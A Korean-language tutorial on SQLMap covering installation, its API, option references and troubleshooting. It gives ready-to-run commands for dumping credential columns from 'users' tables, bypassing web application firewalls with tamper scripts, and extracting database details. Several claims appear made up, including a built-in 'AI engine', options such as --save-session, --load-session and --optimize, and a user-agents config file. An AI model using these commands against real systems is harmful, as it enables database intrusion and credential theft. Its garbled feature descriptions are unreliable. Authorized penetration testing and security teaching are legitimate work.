1. SQLMap란?

SQLMap은 오픈 소스 침투 테스트 도구로, SQL 인젝션(SQLi) 취약점을 자동으로 탐지 및 악용하고 데이터베이스 서버를 탈취하는 프로세스를 자동화합니다. Python으로 작성되어 확장성이 뛰어나며, AI 기반 페이로드 최적화와 지능형 탐지 엔진을 내장하고 있습니다.

🛡️ 자동화된 탐지

블라인드/에러 기반/시간 기반/다중 요청 등 다양한 SQLi 기법을 자동으로 식별하고 검증합니다. AI 엔진이 응답 패턴을 분석하여 최적의 공격 벡터를 선택합니다.

🗄️ 데이터베이스 탈취

DBMS 식별, 스키마 덤프, 테이블/컬럼/데이터 추출, 사용자/해시 덤프, 심지어 운영체제 명령어 실행까지 지원합니다.

⚙️ 고급 우회 & 최적화

WAF(웹 방화벽) 및 IDS 우회 기술 내장, 멀티스레딩, 지능형 캐싱, 세션 관리로 효율적인 테스트를 가능하게 합니다.

2. 왜 써야 하는가?

수동 SQLi 테스트는 시간이 많이 소요되고 오류 가능성이 높습니다. SQLMap은 검증된 알고리즘과 방대한 페이로드 DB로 일관된 결과를 제공합니다.

방법 장점 단점 SQLMap 대비
수동 테스트 세밀한 제어, 특정 컨텍스트 이해 시간 소모적, 전문성 요구, 일관성 부족 자동화로 효율성 10배↑
기존 스크립트 간단한 작업에 빠름 유지보수 부족, 우회 기능 미비, DB 지원 한계 풍부한 기능과 지속 업데이트
상용 도구 통합 환경, 보고서 기능 비용高昂, 폐쇄적, 커스터마이징 어려움 오픈소스 무료·확장 가능
SQLMap 무료·오픈소스, 강력한 자동화, WAF 우회, AI 최적화, 광범위 DB 지원 학습 곡선, 과도한 트래픽 주의 필요 종합적 솔루션

💡 AI 엔지니어에게 중요한 점: SQLMap의 자동화 엔진은 머신러닝 모델 훈련에 필요한 대규모 취약점 데이터셋을 생성하거나, AI 애플리케이션의 백엔드 API 보안 테스트에 활용될 수 있습니다.

3. 핵심 개념

SQLMap은 모듈식 아키텍처로 설계되어 각 구성 요소가 독립적으로 작동하며 협력합니다.

┌─────────────────────────────────────────────────────────────┐ │ SQLMap Core Engine │ │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ │ │ │ Parser │ │ Agent │ │ Cache │ │ Logger │ │ │ │ (입력 분석)│ │(요청 전송)│ │(결과 저장)│ │(로그 기록)│ │ │ └──────────┘ └──────────┘ └──────────┘ └──────────┘ │ └─────────────────────────┬──────────────────────────────────┘ │ ┌─────────────────────────┼────────────────────────────────────────┐ │ Detection & Exploitation Layer │ │ ┌──────────────────┐ ┌──────────────────┐ │ │ │ Injection │ │ Data Extraction│ │ │ │ Detector │◄───페이로드 DB────►│ Modules │ │ │ │ (AI 기반) │ │ (DB별) │ │ │ └──────────────────┘ └──────────────────┘ │ │ │ │ │ │ │ ┌────────┴────────┐ ┌────────┴────────┐ │ │ │ │ Boolean-Based │ │ Schema Dump │ │ │ │ │ Time-Based │ │ Data Dump ├──┘ │ │ │ Error-Based │ │ OS Command │ │ │ │ Stacked Queries │ │ File Access │ │ │ └─────────────────┘ └─────────────────┘ │ └──────────────────────────────────────────────────────────────────┘ │ ┌─────────────────────────┼────────────────────────────────────────┐ │ Optimization & Bypass Layer │ │ ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐ │ │ │ WAF │ │ Tamper │ │ Thread │ │ Session │ │ │ │ Bypass │ │ Scripts │ │ Pool │ │ Manager │ │ │ │ (Cloudflare│ │(페이로드 변조)│ │(병렬 처리) │ │(쿠키/세션) │ │ │ │ AWS WAF) │ │ │ │ │ │ │ │ │ └────────────┘ └────────────┘ └────────────┘ └────────────┘ │ └──────────────────────────────────────────────────────────────────┘

주요 컴포넌트 설명

  • Parser: 사용자 입력(URL, 데이터, 헤더)을 분석하여 테스트 가능한 파라미터를 식별합니다.
  • Detection Engine: AI/휴리스틱을 활용해 가장 효과적인 인젝션 포인트와 기법을 결정합니다.
  • Tamper Scripts: WAF/IDS를 우회하기 위해 페이로드를 인코딩하거나 변조하는 Python 스크립트 모음입니다.
  • Data Extraction Modules: MySQL, PostgreSQL, MSSQL, Oracle 등 다양한 DBMS별로 최적화된 데이터 추출 로직을 포함합니다.

4. 퀵스타트

5분 안에 SQLMap을 설치하고 첫 테스트를 실행해보세요. (테스트는 반드시 허가된 환경에서만 진행하세요)

단계 1: 설치

# Python 패키지 관리자 pip를 이용한 설치 (권장)
pip install sqlmap

# 또는 GitHub에서 최신 개발 버전 클론
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version

# Docker를 이용한 설치 (격리 환경)
docker pull sqlmapproject/sqlmap
docker run -it sqlmapproject/sqlmap --version

단계 2: 기본 설정 확인

# 설정 파일 위치 확인 (사용자 정의 설정 가능)
ls ~/.sqlmap/

# 기본 User-Agent 변경 (선택 사항)
echo '{"http": {"user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}}' > ~/.sqlmap/user-agents.json

# 프록시 설정 (Burp Suite 등과 연동 시)
export http_proxy="http://127.0.0.1:8080"
export https_proxy="http://127.0.0.1:8080"

단계 3: 첫 번째 테스트 실행

# 가장 기본적인 사용법 (GET 파라미터 테스트)
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1"

# POST 데이터와 함께 테스트
python sqlmap.py -u "http://target.com/login.php" --data="username=admin&password=pass"

# 특정 파라미터만 테스트 (여러 파라미터 중)
python sqlmap.py -u "http://target.com/search?id=1&category=2" -p "id"

# 결과를 파일로 저장
python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --output-dir=./scan_results

⚠️ 법적 주의사항: SQLMap은 허가 없이 타인의 시스템을 테스트하는 데 사용되어서는 안 됩니다. 모든 테스트는 자신이 소유하거나 명시적으로 허가를 받은 환경에서만 수행하세요. 무단 테스트는 형사상의 범죄에 해당할 수 있습니다.

단계 4: Python API 활용 (고급)

# sqlmapapi.py를 이용한 프로그래밍 방식 제어
import requests
import json

# SQLMap API 서버 시작 (별도 터미널에서)
# python sqlmapapi.py -s

api_url = "http://127.0.0.1:8775"
task_url = f"{api_url}/task/new"
resp = requests.get(task_url)
task_id = json.loads(resp.text)['taskid']

# 스캔 옵션 설정
options = {
    'url': 'http://testphp.vulnweb.com/artists.php?artist=1',
    'level': 3,
    'risk': 2
}

# 작업 시작
start_url = f"{api_url}/scan/{task_id}/start"
requests.post(start_url, json=options, headers={'Content-Type': 'application/json'})

# 상태 확인
status_url = f"{api_url}/scan/{task_id}/status"
result_url = f"{api_url}/scan/{task_id}/data"

print(f"Task ID: {task_id}")
print("스캔 진행 중... API를 통해 결과를 폴링할 수 있습니다.")

5. 핵심 설정 레퍼런스

SQLMap의 주요 옵션들을 카테고리별로 정리했습니다. --help 명령으로 전체 목록을 확인할 수 있습니다.

옵션 설명 기본값 사용 예시
-u, --url 타겟 URL (필수 옵션 중 하나) - -u "http://target.com/page?id=1"
--data POST 요청 데이터 - --data="user=admin&pass=test"
-p, --param 테스트할 특정 파라미터 지정 모든 파라미터 -p "id,username"
--level 테스트 강도 (1-5). 높을수록 더 많은 테스트 1 --level 3 (권장 실무 설정)
--risk 위험도 (1-3). 높을수록 위험한 쿼리 사용 1 --risk 2
--dbms DBMS 종류 지정 (MySQL, PostgreSQL 등) 자동 감지 --dbms=MySQL
--tables 데이터베이스 테이블 목록 추출 - --tables -D dbname
--columns 테이블 컬럼 정보 추출 - --columns -T users -D dbname
--dump 테이블 데이터 덤프 - --dump -T users
--tamper WAF 우회를 위한 탬퍼 스크립트 사용 - --tamper=space2comment,between
--threads 동시 요청 스레드 수 1 --threads 10 (성능 향상)
--batch 모든 프롬프트에 자동으로 '예' 응답 프롬프트 표시 --batch (자동화 스크립트용)
--output-dir 출력 결과 저장 디렉토리 ~/.sqlmap/output --output-dir=/tmp/scan1

실무 조합 예제

# 완전한 실무용 스캔 명령어
python sqlmap.py -u "https://target.com/api/user" \
  --data="id=123&token=abc" \
  --level=3 \
  --risk=2 \
  --dbms=MySQL \
  --tamper="space2comment,charencode" \
  --threads=5 \
  --batch \
  --output-dir="./scan_report" \
  --flush-session

# 데이터베이스 정보 수집만 (비파괴적)
python sqlmap.py -u "http://target.com/product?id=1" \
  --banner \
  --current-db \
  --current-user \
  --hostname \
  --is-dba

# 특정 데이터만 덤프 (표적 추출)
python sqlmap.py -u "http://target.com/profile?uid=5" \
  --dump -T "users" -C "username,password,email" \
  --where="id=5" \
  --start=1 --stop=10

6. 실무 팁 & 트러블슈팅

자주 겪는 문제와 해결책

문제 1: "target URL is not vulnerable" (취약하지 않다고 판단)

원인: 기본 설정으로는 탐지되지 않는 복잡한 취약점일 수 있습니다.

해결:

# 테스트 강도와 위험도 증가
python sqlmap.py -u "http://target.com" --level=5 --risk=3

# 특정 인젝션 기법 강제 시도
python sqlmap.py -u "http://target.com" --technique="T,E"  # 시간 기반, 에러 기반

# 쿠키/헤더 추가 (인증 필요 시)
python sqlmap.py -u "http://target.com" --cookie="session=abc123" --headers="X-API-Key: secret"

문제 2: WAF(웹 방화벽)에 차단됨

원인: Cloudflare, AWS WAF, ModSecurity 등이 SQLi 패턴을 차단합니다.

해결:

# 탬퍼 스크립트 조합 사용
python sqlmap.py -u "http://target.com" --tamper="space2comment,charencode,randomcase"

# 지연 시간 추가 (시간 기반 공격처럼 위장)
python sqlmap.py -u "http://target.com" --time-sec=5

# 랜덤 User-Agent 사용
python sqlmap.py -u "http://target.com" --random-agent

# 프록시를 통해 Burp Suite로 요청 검토
python sqlmap.py -u "http://target.com" --proxy="http://127.0.0.1:8080"

문제 3: 너무 느린 스캔 속도

원인: 네트워크 지연, 복잡한 페이로드, 단일 스레드 사용.

해결:

# 멀티스레딩 활성화
python sqlmap.py -u "http://target.com" --threads=10

# 최적화 옵션 사용
python sqlmap.py -u "http://target.com" --optimize

# 캐시 활용 (동일 대상 재스캔 시)
python sqlmap.py -u "http://target.com" --flush-session  # 캐시 초기화
python sqlmap.py -u "http://target.com"  # 이후 스캔은 더 빠름

문제 4: 세션/인증 유지 실패

원인: 동적 세션 토큰, CSRF 보호, JWT 만료.

해결:

# 로그인 후 세션 유지 (--forms 옵션)
python sqlmap.py -u "http://target.com/login.php" --forms

# 세션 파일 저장 및 로드
python sqlmap.py -u "http://target.com" --save-session=./target.session
python sqlmap.py -u "http://target.com" --load-session=./target.session

# 요청 간 지연 추가
python sqlmap.py -u "http://target.com" --delay=2  # 2초 대기

AI 엔지니어를 위한 고급 팁

  • 데이터셋 생성: SQLMap의 --dump 결과를 정형화하여 머신러닝 모델 훈련용 취약점 데이터셋으로 활용할 수 있습니다.
  • API 연동: sqlmapapi.py를 사용해 CI/CD 파이프라인에 보안 테스트를 자동으로 통합하세요.
  • 커스텀 탐지: Python으로 직접 탐지 로직을 작성하여 특정 애플리케이션 패턴에 최적화할 수 있습니다.
  • 퍼징 엔진: SQLMap의 페이로드 생성기를 AI 기반 퍼징 테스트에 활용하세요.
